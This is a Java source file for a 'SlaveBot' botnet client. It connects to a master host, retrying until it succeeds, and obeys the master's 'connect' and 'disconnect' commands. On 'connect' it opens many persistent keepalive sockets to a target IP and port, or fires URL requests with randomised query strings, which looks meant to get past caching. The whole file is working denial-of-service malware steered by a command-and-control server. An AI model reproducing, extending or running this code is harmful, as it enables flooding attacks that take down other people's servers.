import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.LinkedList;
import java.util.Random;

class RandomString {

	private static final char[] symbols;

	static {
		StringBuilder tmp = new StringBuilder();
		for (char ch = '0'; ch <= '9'; ++ch)
			tmp.append(ch);
		for (char ch = 'a'; ch <= 'z'; ++ch)
			tmp.append(ch);
		symbols = tmp.toString().toCharArray();
	}

	private final Random random = new Random();

	private final char[] buf;

	public RandomString(int length) {
		if (length < 1)
			throw new IllegalArgumentException("length < 1: " + length);
		buf = new char[length];
	}

	public String nextString() {
		for (int idx = 0; idx < buf.length; ++idx)
			buf[idx] = symbols[random.nextInt(symbols.length)];
		return new String(buf);
	}
}

class SlaveBot {

	public static void main(String[] args) {

		// parse arguments
		if (args.length != 4) {
			System.out.println("SlaveBot -h IPAddress|Hostname -p port");
			System.exit(-1);
		}

		String masterAddress = null;
		int masterPort = 0;

		for (int i = 0; i < 4; ++i) {
			if (args[i].equals("-h")) {
				masterAddress = args[++i];
			} else if (args[i].equals("-p")) {
				masterPort = Integer.parseInt(args[++i]);
			} else {
				System.out.println("SlaveBot -h IPAddress|Hostname -p port");
				System.exit(-1);
			}
		}

		SlaveBot slaveBot = new SlaveBot(masterAddress, masterPort);

		try {
			slaveBot.run();
		} catch (Exception e) {
			System.exit(-1);
		}
	}

	private Socket socket;

	private LinkedList<Target> targetList;

	private BufferedReader in;

	public SlaveBot(String masterAddress, int masterPort) {

		while (true) {
			try {
				this.socket = new Socket(masterAddress, masterPort);
				this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
				break;
			} catch (Exception e) {
				try {
					Thread.sleep(3000);
				} catch (InterruptedException ie) {
					System.exit(-1);
				}
			}
		}
		this.targetList = new LinkedList<Target>();
	}

	public void connect(String[] tokens) {
		if (tokens.length < 4) {
			return; // error
		}

		String targetIP = tokens[1];
		String targetPort = tokens[2];
		int numberOfConnections = 1;
		boolean keepAlive = false;
		String url = "";
		String query = new RandomString((new Random()).nextInt(10)).nextString();

		try {
			numberOfConnections = Integer.parseInt(tokens[3]);
		} catch (NumberFormatException e) {
			numberOfConnections = 1;
		}
		for (int i = 0; i < numberOfConnections; ++i) {
			if (tokens.length == 5) {
				if (tokens[4].compareToIgnoreCase("keepAlive") == 0) {
					keepAlive = true;
				} else {
					url = tokens[4] + "/#q=" + query;
				}

			}

			if (keepAlive) {
				try {
					targetList.add(new Target(targetIP, targetPort));
					targetList.getLast().getTargetSocket().setKeepAlive(true);
				} catch (Exception e) {
					// can not create Target
				}
			}
			if (url != "") {
				try {
					System.out.println(url);
					URL myURL = new URL(url);
					URLConnection myURLConnection = myURL.openConnection();
					myURLConnection.connect();
				} catch (MalformedURLException e) {
					// new URL() failed
					// ...
				} catch (IOException e) {
					// openConnection() failed
					// ...
				}
			}
		}
	}

	public void disconnect(String[] tokens) {
		int len = tokens.length;
		if (len < 2 || len > 3)
			return; // error

		int size = targetList.size();

		for (int i = 0; i < size; ++i) {
			if (len == 3) {
				if (targetList.get(i).getTargetIP().equalsIgnoreCase(tokens[1])
						&& targetList.get(i).getTargetPort().equalsIgnoreCase(tokens[2])) {
					try {
						targetList.get(i).getTargetSocket().shutdownInput();
						targetList.get(i).getTargetSocket().shutdownOutput();
						targetList.get(i).getTargetSocket().close();
					} catch (IOException e) {

					}
					targetList.remove(i);
					--size;
					--i;
				}
			} else {
				if (targetList.get(i).getTargetIP().equalsIgnoreCase(tokens[1])) {
					try {
						targetList.get(i).getTargetSocket().shutdownInput();
						;
						targetList.get(i).getTargetSocket().shutdownOutput();
						targetList.get(i).getTargetSocket().close();
					} catch (IOException e) {

					}
					targetList.remove(i);
					--size;
					--i;
				}

			}
		}
	}

	public void parseCommand(String line) {
		if (line == null || line.isEmpty())
			return;

		String tokens[] = line.split("[ ]+");
		tokens[0] = tokens[0].replaceAll("[^A-Za-z0-9]", "");
		switch (tokens[0]) {
		case "connect":
			connect(tokens);
			break;
		case "disconnect":
			disconnect(tokens);
			break;
		default:
			// System.out.println("Invalid Command!");
		}
	}

	public void run() {
		while (true) {
			try {
				String line = in.readLine();
				parseCommand(line);
			} catch (Exception e) {
				System.exit(-1);
			}
		}
	}
}

class Target {
	private String targetIP;
	private String targetPort;
	private Socket targetSocket;

	public Target(String targetIP, String targetPort) {
		this.targetIP = targetIP.trim();
		this.targetPort = targetPort;
		int port = Integer.parseInt(targetPort);

		while (true) {
			try {
				this.targetSocket = new Socket(this.targetIP, port);
				break;
			} catch (Exception e) {
				try {
					Thread.sleep(10000);
				} catch (InterruptedException ie) {
					System.exit(-1);
				}
			}
		}
	}

	public String getTargetIP() {
		return targetIP;
	}

	public String getTargetPort() {
		return targetPort;
	}

	public Socket getTargetSocket() {
		return targetSocket;
	}

	public void setTargetIP(String targetIP) {
		this.targetIP = targetIP;
	}

	public void setTargetPort(String targetPort) {
		this.targetPort = targetPort;
	}

	public void setTargetSocket(Socket targetSocket) {
		this.targetSocket = targetSocket;
	}

}
